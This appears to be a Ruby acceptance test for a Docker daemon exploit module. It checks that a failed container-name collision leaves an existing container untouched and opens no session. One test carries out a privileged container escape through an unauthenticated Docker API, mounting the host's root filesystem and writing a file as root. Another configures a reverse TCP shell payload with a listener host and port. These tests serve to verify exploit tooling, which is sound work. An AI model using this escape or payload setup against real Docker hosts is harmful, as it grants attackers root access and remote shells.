# frozen_string_literal: true

require_relative '../docker_daemon/acceptance'

# A native stopped container must survive a genuine owner name collision.
module DockerDaemonNamesAcceptance
  def blank_name_native_control
    path = "/tmp/module-target-docker-blank-native-#{@case}"
    expect(native_file_state([path])).to all(include('exists' => false))
    @owned_markers << path
    identifier = nil
    begin
      document = {
        'Image' => 'module-target-native:base',
        'Cmd' => "printf blank-native > /mnt/host#{path}",
        'Entrypoint' => %w[/bin/sh -c],
        'HostConfig' => { 'Binds' => ['/:/mnt/host'], 'Privileged' => true, 'UsernsMode' => 'host' }
      }
      response = native_http('http://127.0.0.1:2375', path: '/containers/create?name=', method: 'POST', data: document)
      expect(response.fetch(:status)).to eq(201)
      identifier = JSON.parse(Base64.strict_decode64(response.fetch(:body_base64))).fetch('Id')
      expect(identifier).to match(/\A[0-9a-f]{64}\z/)
      inspection = JSON.parse(inner('container', 'inspect', identifier)).fetch(0)
      expect(inspection.fetch('Name').delete_prefix('/')).not_to be_empty
      expect(native_http('http://127.0.0.1:2375', path: "/containers/#{identifier}/start", method: 'POST').fetch(:status)).to eq(204)
      waited = native_http('http://127.0.0.1:2375', path: "/containers/#{identifier}/wait", method: 'POST')
      expect(waited.fetch(:status)).to eq(200)
      expect(JSON.parse(Base64.strict_decode64(waited.fetch(:body_base64))).fetch('StatusCode')).to eq(0)
      expect(target_exec('target', 'cat', path)).to eq('blank-native')
      expect(target_exec('target', 'stat', '-c', '%u', path).strip).to eq('0')
      record('docker-daemon-blank-name-control.jsonl', create_uri: '/containers/create?name=', actual_id: identifier, assigned_name: inspection.fetch('Name'), actual_root_write: true, addressed_by_returned_id: true)
    ensure
      remove_owned_container(identifier) if identifier&.match?(/\A[0-9a-f]{64}\z/)
      target_exec('target', 'rm', '-f', '--', path)
    end
    expect(native_file_state([path])).to all(include('exists' => false))
    preserved
  end

  def named_container_collision
    name = "module-target-preserve-#{@case}"
    identifier = inner('create', '--name', name, '--label', 'module-target-preserve=unchanged', 'module-target-native:base', '/bin/true').strip
    expect(identifier).to match(/\A[0-9a-f]{64}\z/)
    begin
      original = JSON.parse(inner('container', 'inspect', identifier)).fetch(0)
      expect(original.fetch('State').fetch('Status')).to eq('created')
      expect(original.fetch('Config').fetch('Labels')).to include('module-target-preserve' => 'unchanged')
      offset = owner_rows.length
      settings = {
        'CONTAINER_ID' => name, 'DOCKERIMAGE' => 'module-target-native:base',
        'TARGET' => 0, 'PAYLOAD' => 'linux/x64/shell_reverse_tcp',
        'LHOST' => listener_host, 'LPORT' => 4497, 'WfsDelay' => 0,
        'DisablePayloadHandler' => false, 'HttpClientTimeout' => 10
      }
      output = run_target_module(DockerDaemonAcceptance::OWNER, 'target', settings, action: 'run -z', allow_errors: true, command_timeout: 45)
      observed = owner_rows.drop(offset)
      record('docker-daemon-invocations.jsonl', action: 'run -z', settings: settings, output: output, rows: observed)
      expect(output).to include('Failed to create the docker container')
      requests = observed.select { |row| row['kind'] == 'http' }
      expect(requests.select { |row| row['method'] == 'POST' }).to contain_exactly(include('uri' => '/containers/create?name=' + name, 'status' => 409))
      expect(requests.select { |row| row['method'] == 'DELETE' }).to eq([])
      current = JSON.parse(inner('container', 'inspect', identifier)).fetch(0)
      record('docker-daemon-preserved-container.jsonl', id: identifier, original: original, after_owner: current)
      expect(current).to eq(original)
      expect(host_file_names).to match_array(@before_files)
      expect(session_rows).to eq([])
      expect(rpc('{jobs:framework.jobs.keys,sessions:framework.sessions.keys}')).to eq('jobs' => [], 'sessions' => [])
    ensure
      # This ID comes from our successful native create, never from the name
      # supplied to the owner or from a guessed random-looking identifier.
      remove_owned_container(identifier)
    end
  end
end
